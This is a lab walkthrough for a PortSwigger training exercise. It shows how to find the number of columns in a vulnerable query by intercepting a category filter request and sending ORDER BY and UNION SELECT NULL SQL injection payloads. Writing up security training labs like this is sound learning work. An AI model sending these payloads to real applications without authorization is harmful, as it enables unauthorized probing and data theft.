[Lab: SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)  


## Steps to Solve

1. **Launch the Lab:** Open the PortSwigger lab and navigate to the shop interface.

2. **Intercept the Request:** Click on the **Accessories** category and intercept the category filter request using Burp Suite.

3. **Determine the Number of Columns:** Use `ORDER BY` to test the number of columns.

- `ORDER BY 1` – Success
- `ORDER BY 2` – Success
- `ORDER BY 3` – Success
- `ORDER BY 4` – Error

**Result:** The query returns three columns.

4. **Verify Using UNION SELECT:** Start with one `NULL` value and gradually add more until the error disappears.

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Result:** The three-column payload executes successfully.

5. **Verify Lab Completion:** Observe the response. If additional content appears without an SQL error, the lab is solved.

## Key Takeaways

- **ORDER BY:** Determines the number of columns in a query.
- **UNION SELECT:** Combines results from multiple queries.
- **NULL:** Useful for testing column count without knowing their data types.

## Lab Information

- **Vulnerability:** SQL Injection (SQLi)
- **Attack Type:** UNION-Based SQL Injection
- **Tool:** Burp Suite Community Edition
